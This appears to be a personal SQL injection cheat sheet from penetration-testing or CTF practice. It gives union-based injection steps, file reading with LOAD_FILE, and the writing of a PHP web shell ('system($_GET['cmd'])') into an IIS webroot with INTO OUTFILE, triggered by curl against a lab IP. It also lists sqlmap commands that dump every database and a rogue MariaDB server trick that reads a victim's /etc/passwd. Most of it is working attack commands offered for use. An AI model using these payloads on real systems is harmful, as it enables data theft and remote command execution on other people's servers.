SQL_related

## Main example

- Try directly in the url, or in the data sent :
- ' 
- ' -- -
- ' order by 1-- -
- increase this until you found the number of field you can control
- 'union select 1,2,... -- -
- Then in the field you can see, inject whatever you want
- Use the payloads from payloadallthethings

### Find information about the database

- type in google information schema \<type_of_db(mysql for example)\>

- Information Gathering for SQLI : https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql


### Subquerry returns more than 1 row :

- ```select group_concat(<your_query(for example scheme_data>)```

### Want to have a better view 

- add separator to your query : ```SEPARATOR '\n'```

### Load file

- ```select concat("\n\n", TO_BASE64(LOAD_FILE("C:\\\\inetpub\\\\wwwroot\\\\admins.php")),"\n\n")```

### Reverse shell

- ```union select "test",2,3 INTO OUTFILE "C:\\\\inetpub\\\\wwwroot\\\\test.txt"```

- Hit this two times
- If it works :
- ```"<pre><?php system($_GET['cmd']); ?></pre>" INTO OUTFILE 'c:/inetpub/wwwroot/7868768678.php'```
- ```curl ...?cmd=whoami```
- you can replace by ```INTO DUMPFILE```

---

## SQLMAP

### Use injection found before with burpsuite

- Note that it is not working well with the sqlmap download from source on arch linux. If so, download from git directly the binary.

- right click, copy to a file (from intruder window)

- delete the part you inject (the ' too)

- ```sqlmap -r \<file\> --technique=U --batch --dump-all```

- Here the technique used is Union because we found it before, but there are others available (BEUST)

- If you don't know the type of injection : ```sqlmap -r <file> -p productName --dbs```
- or ```sqlmap -r <file> --threads=10 --dbs```

- add ```--batch``` to skip all the questions

- Then, you have the databases, go and see what tables are inside : ```sqlmap -r <file> -D <database> --tables```
- Then dump the needed table : ```sqlmap -r <file> -D <database> -T <table> --dump

### Reverse shell with sqlmap

- On mysql we can check if we have the permission to write on disk with following commands

	
- ```sql-shell> select @@secure_file_priv;```
	
- ```sql-shell> select @@global.secure_file_priv;```


- If their content is empty itâ€™s mean we can !

- Usually the root of the IIS application is at c:/inetpub/wwwroot/ so I tried

	
- ```sql-shell> SELECT "<pre><?php system($_GET['cmd']); ?></pre>" INTO OUTFILE 'c:/inetpub/wwwroot/7868768678.php'```

- and now testing if it was successfully written

	
- ```curl "http://10.10.10.167/7868768678.php?cmd=whoami"```

---

## Remote access to a sql database

https://www.linode.com/docs/databases/mariadb/mariadb-setup-debian/

- edit my.cnf.d/server.cnf with the bind address

- create a database and a table :

```
create database exploit;
use exploit;
create table dmp(content varchar(5000));
```


- Then see if you can load file from victim machine :

```
LOAD DATA LOCAL INFILE '/etc/passwd' 
INTO TABLE test.test
FIELDS TERMINATED BY "\n"
```

---

## Lot of stuff

https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html

---

## Login and password of mysql database and connected on the machine ?

- ```mysqldump --databases <database> -u<user> -p<password>```
	

